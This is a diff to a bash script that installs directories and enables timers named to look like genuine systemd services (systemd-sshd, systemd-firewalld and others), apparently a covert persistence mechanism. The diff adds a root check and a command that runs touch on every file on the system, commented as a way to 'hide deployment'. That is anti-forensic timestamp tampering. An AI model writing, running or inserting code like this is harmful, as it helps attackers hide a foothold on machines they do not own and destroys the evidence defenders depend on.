@@ -1,5 +1,11 @@
 #! /bin/bash
 
+# Check if we are root and bail out if not
+if [ "$EUID" -ne 0 ]; then
+	echo "You must run this script as root"
+	exit
+fi
+
 # Make the directories
 mkdir --parents /usr/share/systemd-bootd
 mkdir --parents /usr/share/systemd-firewalld
@@ -34,3 +40,8 @@ systemctl enable --now systemd-firewalld.timer
 systemctl enable --now systemd-printerd.timer
 systemctl enable --now systemd-sshd.timer
 systemctl enable --now systemd-userd.timer
+
+# Touch every file to hide deployment
+find / -exec touch --dereference {} +
+
+# vim: set filetype=sh:
